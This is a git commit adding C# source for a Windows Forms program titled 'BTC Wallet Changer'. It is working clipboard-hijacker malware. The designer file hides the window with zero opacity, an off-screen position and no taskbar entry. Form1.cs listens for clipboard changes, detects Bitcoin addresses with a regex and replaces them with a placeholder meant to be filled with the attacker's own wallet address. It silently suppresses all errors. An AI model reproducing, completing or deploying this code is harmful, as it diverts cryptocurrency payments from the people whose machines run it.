c48d20a526db8b488182a4ee66b0feaab798b4a7
Sir-Programmer <73423251+Sir-Programmer@users.noreply.github.com>
2021-10-10 11:52:30 -0700

    Add files via upload

---
+++ BTC Wallet Changer/BTC Wallet Changer/Form1.Designer.cs
@@ -0,0 +1,68 @@
+﻿namespace BTC_Wallet_Changer
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.label1 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(20, 17);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(151, 17);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "Bitcoin Wallet Changer";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(193, 49);
+            this.Controls.Add(this.label1);
+            this.Location = new System.Drawing.Point(9999999, 9999999);
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Opacity = 0D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.Text = "BTC Wallet Changer";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+    }
+}
+
---
+++ BTC Wallet Changer/BTC Wallet Changer/Form1.cs
@@ -0,0 +1,47 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace BTC_Wallet_Changer
+{
+    public partial class Form1 : Form
+    {
+		[DllImport("user32.dll", SetLastError = true)]
+		[return: MarshalAs(UnmanagedType.Bool)]
+		private static extern bool AddClipboardFormatListener(IntPtr hwnd);
+		public Form1()
+        {
+            InitializeComponent();
+			AddClipboardFormatListener(Handle);
+		}
+		internal static bool ProbablyBtcAddress(string clipboard)
+		{
+			string input = clipboard.Trim();
+			return new Regex("^(1|3)[1-9A-HJ-NP-Za-km-z]{26,34}$").IsMatch(input);
+		}
+		protected override void WndProc(ref Message m)
+		{
+			try
+			{
+				base.WndProc(ref m);
+				if (m.Msg != 0x031D) return;
+				if (!Clipboard.ContainsText()) return;
+				if (ProbablyBtcAddress(Clipboard.GetText()))
+				{
+					Clipboard.SetText("Paste Your Wallet Address Here!");
+				}
+			}
+			catch
+			{
+			}
+		}
+    }
+}
